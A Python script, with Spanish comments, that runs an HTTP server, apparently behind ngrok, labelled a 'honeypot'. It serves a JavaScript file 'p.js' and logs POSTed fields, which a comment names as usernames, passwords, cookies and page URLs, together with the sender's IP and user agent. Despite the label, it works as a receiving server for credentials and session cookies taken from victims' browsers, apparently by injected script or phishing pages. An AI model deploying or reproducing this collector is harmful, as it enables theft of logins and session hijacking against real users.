#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse as urlparse
import os, time, re

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "honeypot_log.txt")

def parse_forwarded(header):
    # RFC 7239: Forwarded: for=1.2.3.4; proto=https; by=...
    if not header:
        return None
    m = re.search(r'for="?(\[?[a-fA-F0-9\.:]+\]?)"?', header)
    return m.group(1) if m else None

class H(BaseHTTPRequestHandler):
    def client_ip(self):
        xf = self.headers.get("X-Forwarded-For", "")
        xr = self.headers.get("X-Real-Ip", "")
        fwd = self.headers.get("Forwarded", "")

        # X-Forwarded-For puede traer lista "ip1, ip2, ip3"
        if xf:
            return xf.split(",")[0].strip()
        if xr:
            return xr.strip()
        if fwd:
            ip = parse_forwarded(fwd)
            if ip:
                return ip
        # Fallback: IP del socket (normalmente 127.0.0.1 detrás de ngrok)
        return self.client_address[0]

    def do_GET(self):
        # Sirve p.js si lo pides (opcional; mantenlo si ya lo usas)
        if self.path.startswith("/p.js"):
            pjs = os.path.join(BASE_DIR, "p.js")
            if os.path.isfile(pjs):
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.end_headers()
                with open(pjs, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404); self.end_headers()
                self.wfile.write(b"p.js not found\n")
            return
        self.send_response(200); self.end_headers()
        self.wfile.write(b"OK - honeypot up. POST /collect\n")

    def do_POST(self):
        if self.path != "/collect":
            self.send_response(404); self.end_headers(); self.wfile.write(b"Not Found\n")
            return

        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "ignore")
        params = urlparse.parse_qs(body)

        ip = self.client_ip()
        ua = self.headers.get("User-Agent", "-")

        os.makedirs(BASE_DIR, exist_ok=True)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] IP: {ip}\n")
            f.write(f"UA: {ua}\n")
            # Volcamos los campos POST (username, password, cookies, page_url, marker, probe, etc.)
            for k, v in params.items():
                f.write(f"{k}: {v}\n")
            f.write("-"*25 + "\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Gracias. Sus datos han sido procesados.\n")

    def log_message(self, *a):  # silenciar stdout
        return

if __name__ == "__main__":
    print("Honeypot en 0.0.0.0:8080 -> GET /p.js, POST /collect")
    HTTPServer(("0.0.0.0", 8080), H).serve_forever()
